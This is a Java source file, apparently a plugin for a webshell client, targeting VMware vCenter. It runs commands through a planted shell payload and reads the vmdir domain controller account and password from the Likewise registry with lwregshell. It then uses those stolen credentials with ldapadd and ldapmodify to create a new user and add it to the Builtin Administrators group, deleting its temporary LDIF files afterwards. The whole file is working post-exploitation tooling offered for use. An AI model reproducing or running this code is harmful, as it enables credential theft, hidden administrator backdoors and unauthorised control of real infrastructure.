package shells.plugins.vc;

import core.ApplicationContext;
import core.Db;
import core.Encoding;
import core.imp.Payload;
import core.shell.ShellEntity;
import util.Log;

import java.security.SecureRandom;
import java.util.HashMap;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LdapManage {
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;


    public LdapManage(ShellEntity shellEntity, Payload payload, Encoding encoding){
        this.encoding = encoding;
        this.payload = payload;
        this.shellEntity = shellEntity;
    }
    private String runRealCmd(String command, boolean out){
        // 直接调用this.payload.execCommand 会有参数解析错误，参考 ShellExecCommandPanel.execEasyCommand 解决

        String command2  = "sh -c \"{command}\" 2>&1".replace("{command}", command);
        if (ApplicationContext.isOpenC("isSuperLog")) {
            Log.log("mode : %s command : %s", Db.getSetingValue("EXEC_COMMAND_MODE"), command2);
        }
        String output = this.payload.execCommand(command2);
        if (out) return output;
        return null;
    }

    private void runRealCmd(String command){
        runRealCmd(command, false);
    }

    public static String randstr(int num) {
        String charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
        StringBuilder sb = new StringBuilder(num);
        Random random = new SecureRandom();
        for (int i = 0; i < num; i++) {
            sb.append(charset.charAt(random.nextInt(charset.length())));
        }
        return sb.toString();
    }

    private HashMap<String, String> getLDAPConfig(){
       String result = runRealCmd("/opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\\services\\vmdir]'", true);
        String dcAccount = "";
        String dcAccountDN = "";
        String dcAccountPassword = "";

        Pattern pattern1 = Pattern.compile("\"dcAccount\"(.*)");
        Matcher matcher1 = pattern1.matcher(result);
        if (matcher1.find()) {
            dcAccount = matcher1.group(1).split(" ")[matcher1.group(1).split(" ").length - 1].substring(1, matcher1.group(1).split(" ")[matcher1.group(1).split(" ").length - 1].length() - 1);
        }

        Pattern pattern2 = Pattern.compile("\"dcAccountDN\"(.*)");
        Matcher matcher2 = pattern2.matcher(result);
        if (matcher2.find()) {
            dcAccountDN = matcher2.group(1).split("REG_SZ")[matcher2.group(1).split("REG_SZ").length - 1].trim().substring(1, matcher2.group(1).split("REG_SZ")[matcher2.group(1).split("REG_SZ").length - 1].trim().length() - 1);
        }

        Pattern pattern3 = Pattern.compile("\"dcAccountPassword\"(.*)");
        Matcher matcher3 = pattern3.matcher(result);
        if (matcher3.find()) {
            dcAccountPassword = matcher3.group(1).split("  ")[matcher3.group(1).split("  ").length - 1].substring(1, matcher3.group(1).split("  ")[matcher3.group(1).split("  ").length - 1].length() - 1).replace("\\\"", "\"");
        }

        HashMap<String, String> ldapConfig = new HashMap<>();
        ldapConfig.put("dcAccount", dcAccount);
        ldapConfig.put("dcAccountDN", dcAccountDN);
        ldapConfig.put("dcAccountPassword", dcAccountPassword);
        return ldapConfig;
    }

    public String addUser(String username){
        HashMap<String, String> ldapConfig = getLDAPConfig();
        String dcAccount = ldapConfig.get("dcAccount");
        String dcAccountDN = ldapConfig.get("dcAccountDN");
        String dcAccountPassword = ldapConfig.get("dcAccountPassword");
        String ldifFile = "/tmp/adduser.ldif";
        String password = randstr(20);
        String dn = String.format("cn=%s,cn=Users,%s", username, dcAccountDN.split("Controllers,")[1]);
        String userPrincipalName = String.format("%s@%s.%s", username, dcAccountDN.split(",")[1].substring(3), dcAccountDN.split(",")[2].substring(3));
        String ADDUSER = String.format("dn: %s\nuserPrincipalName: %s\nsAMAccountName: %s\ncn: %s\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\nuserPassword: %s\n", dn, userPrincipalName, username, username, password);

        this.payload.uploadFile(ldifFile, ADDUSER.getBytes());
        String command = String.format("ldapadd -x -h %s -D '%s' -w '%s' -f %s", dcAccount, dcAccountDN, dcAccountPassword, ldifFile);
        String result = runRealCmd(command, true);
        String user_info = "[+] " + result +"\n" +
                "[+] All done." +"\n" +
                "[+] New user: " + username +"\n" +
                "    Password: " + password + "\n" +
                "[!] Remember to add it as an admin";
        this.payload.deleteFile(ldifFile);
        return user_info;
    }

    public String addAdmin(String username){
        HashMap<String, String> ldapConfig = getLDAPConfig();
        String dcAccount = ldapConfig.get("dcAccount");
        String dcAccountDN = ldapConfig.get("dcAccountDN");
        String dcAccountPassword = ldapConfig.get("dcAccountPassword");
        String ldifFile = "/tmp/addadmin.ldif";
        String base = dcAccountDN.split("Controllers,")[1];
        String dn = String.format("cn=%s,cn=Users,%s", username, dcAccountDN.split("Controllers,")[1]);
        String addAdmin = String.format("dn: cn=Administrators,cn=Builtin,%s\nchangetype: modify\nadd: member\nmember: %s\n", base, dn);
        this.payload.uploadFile(ldifFile, addAdmin.getBytes());
        String command = String.format("ldapmodify -x -h %s -D '%s' -w '%s' -f %s", dcAccount, dcAccountDN, dcAccountPassword, ldifFile);
        String result = runRealCmd(command, true);
        String user_info = "[+] " + result +"\n" +
                "[+] All done.";
        this.payload.deleteFile(ldifFile);
        return user_info;
    }

}
